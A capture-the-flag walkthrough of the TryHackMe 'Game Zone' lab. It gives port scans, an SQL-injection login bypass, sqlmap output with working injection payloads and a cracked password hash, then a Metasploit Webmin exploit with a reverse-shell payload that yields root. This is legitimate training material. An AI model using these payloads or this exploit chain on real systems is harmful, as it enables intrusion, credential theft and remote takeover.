| [![Game Zone](/_static/images/suit.png)](https://tryhackme.com/room/gamezone) |
|:--:|
| [https://tryhackme.com/room/gamezone](https://tryhackme.com/room/gamezone) |

# Game Zone

Bruteforce a websites login with Hydra, identify and use a public exploit, then escalate privileges.

## Exploring

| ![Game Zone](/_static/images/screenshot-game-zone.png)
|:--:|
| Welcome page clues |

A [reverse image search](https://www.reverseimagesearch.com/) gave the name of the agent (47).

## Scanning

Run a simple port scan (without Ping)

	# nmap -Pn -p- <IP address target machine> -oN portscan

portscan:

```text
# Nmap 7.92 scan initiated Fri Sep 30 21:09:37 2022 as: nmap -Pn -p- -oN portscan 10.10.13.164
Nmap scan report for 10.10.13.164
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Fri Sep 30 21:11:01 2022 -- 1 IP address (1 host up) scanned in 83.49 seconds
```

Run an `-A` scan on the open ports:

	# nmap -Pn -T4 -A -p22,80 <IP address target machine> -oN servicescan

servicescan:

```text
# Nmap 7.92 scan initiated Fri Sep 30 21:15:40 2022 as: nmap -Pn -T4 -A -p22,80 -oN servicescan 10.10.13.164
Nmap scan report for 10.10.13.164
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Game Zone
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   39.80 ms 10.9.0.1
2   40.16 ms 10.10.13.164

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 30 21:15:58 2022 -- 1 IP address (1 host up) scanned in 17.68 seconds
```

## Using SQLMap

In the main page, use `' or 1=1 -- -` as username and leave the password blank. This logs you in and calls up a
`portal.php` page with a search box.

Intercept a `test` search on the portal page with Burpsuite:

| ![Intercepted search request](/_static/images/screenshot-intercept-game.png)
|:--:|
| Intercepted search request |

Save the intercepted request in a `.txt` file, to feed into `sqlmap`.

Run SQLMap:

* `-r` uses the intercepted request you saved earlier
* `--dbms` tells SQLMap what type of database management system it is
* `--dump` attempts to outputs the entire database

```text
# sqlmap -r intercepted-search.txt --dbms=mysql --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:05:35 /2022-09-30/

[22:05:35] [INFO] parsing HTTP request from 'intercepted-search.txt'
[22:05:35] [INFO] testing connection to the target URL
[22:05:35] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:05:35] [INFO] testing if the target URL content is stable
[22:05:36] [INFO] target URL content is stable
[22:05:36] [INFO] testing if POST parameter 'searchitem' is dynamic
[22:05:36] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[22:05:36] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[22:05:36] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[22:05:36] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:06:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:06:18] [WARNING] reflective value(s) found and filtering out
[22:06:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:06:19] [INFO] testing 'Generic inline queries'
[22:06:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[22:06:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[22:06:22] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="is")
[22:06:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:06:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[22:06:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[22:06:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[22:06:22] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[22:06:22] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[22:06:22] [INFO] testing 'MySQL inline queries'
[22:06:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:06:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[22:06:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[22:06:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[22:06:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[22:06:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[22:06:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:06:33] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:06:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:06:33] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[22:06:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:06:33] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:06:33] [INFO] target URL appears to have 3 columns in query
[22:06:33] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[22:06:33] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-2346' OR 3692=3692#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=test' AND GTID_SUBSET(CONCAT(0x7176717871,(SELECT (ELT(2162=2162,1))),0x7171766b71),2162)-- XNGt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=test' AND (SELECT 2073 FROM (SELECT(SLEEP(5)))kWHq)-- zuOM

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=test' UNION ALL SELECT NULL,NULL,CONCAT(0x7176717871,0x75456e594846767a627a696f4d55796e434f7652686e776849744f6e6d6c53554d43705875715358,0x7171766b71)#
---
[22:06:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[22:06:53] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[22:06:53] [INFO] fetching current database
[22:06:53] [INFO] fetching tables for database: 'db'
[22:06:54] [INFO] fetching columns for table 'post' in database 'db'
[22:06:54] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[22:06:54] [INFO] table 'db.post' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.13.164/dump/db/post.csv'
[22:06:54] [INFO] fetching columns for table 'users' in database 'db'
[22:06:54] [INFO] fetching entries for table 'users' in database 'db'
[22:06:54] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[22:07:01] [INFO] writing hashes to a temporary file '/tmp/sqlmapo7l6ufaf347892/sqlmaphashes-420lpe1l.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[22:07:07] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 2
what's the custom dictionary's location?
> /usr/share/wordlists/rockyou.txt
[22:13:45] [INFO] using custom dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[22:14:20] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[22:14:20] [INFO] starting 4 processes 
[22:14:43] [INFO] cracked password 'videogamer124' for user 'agent47'          
Database: db                                                                   
Table: users
[1 entry]
+----------------------------------------------------------------------------------+----------+
| pwd                                                                              | username |
+----------------------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 (videogamer124) | agent47  |
+----------------------------------------------------------------------------------+----------+

[22:17:28] [INFO] table 'db.users' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.13.164/dump/db/users.csv'
[22:17:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.13.164'

[*] ending @ 22:17:28 /2022-09-30/
```

## Cracking password with John

We already have the password, but do again:

    # echo "ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14" > agent47.txt
    # john agent47.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256

With username and password known, `ssh` into the target:

    ssh agent47@<IP address target machine>                            

    Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
    agent47@gamezone:~$ ls
    user.txt
    agent47@gamezone:~$ cat user.txt

## Exposing services with reverse SSH tunnels 

Use `ss` to investigate sockets:

```text
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q       Local Address:Port        Peer Address:Port
udp    UNCONN     0      0                     *:10000              *:*
udp    UNCONN     0      0                     *:68                 *:*
tcp    LISTEN     0      80            127.0.0.1:3306               *:*
tcp    LISTEN     0      128                   *:10000              *:*
tcp    LISTEN     0      128                   *:22                 *:*
tcp    LISTEN     0      128                  :::80                :::*
tcp    LISTEN     0      128                  :::22                :::*
```

Port 10000 is blocked via a firewall rule (`iptables`). Use a reverse `ssh` tunnel:

    # ssh -L 10000:localhost:10000 agent47@<IP address target machine>

Browsing `http://127.0.0.1:10000` now shows a Webmin portal.

Check version in local machine:

    # nmap -sV -p 10000 127.0.0.1 -vv
    ...
    
    PORT      STATE SERVICE REASON  VERSION
    10000/tcp open  http    syn-ack MiniServ 1.580 (Webmin httpd)

Searchsploit:

    # searchsploit webmin 1.580  
    ---------------------------------------------- ---------------------------------
     Exploit Title                                |  Path
    ---------------------------------------------- ---------------------------------
    Webmin 1.580 - '/file/show.cgi' Remote Comman | unix/remote/21851.rb
    Webmin < 1.920 - 'rpc.cgi' Remote Code Execut | linux/webapps/47330.rb
    ---------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results


[Searching for 21851 in exploit-db](https://www.exploit-db.com/exploits/21851) gives CVE: 2012-2982

## Privilege escalation with Metasploit

    # msfconsole -q
    [*] Starting persistent handler(s)...
    msf6 > search CVE-2012-2982
    
    Matching Modules
    ================
    
       #  Name                                      Disclosure Date  Rank       Check  Description
       -  ----                                      ---------------  ----       -----  -----------
       0  exploit/unix/webapp/webmin_show_cgi_exec  2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
    
    
    Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/webmin_show_cgi_exec
    
    msf6 > use 0
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PAYLOAD cmd/unix/reverse
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set RHOSTS 127.0.0.1
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set SSL false
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set RPORT 10000
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set USERNAME agent47
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set PASSWORD videogamer124
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set LHOST 10.10.13.164
    msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run

And get flag:

    pwd
    /usr/share/webmin/file/
    whoami
    root
    cat /root/root.txt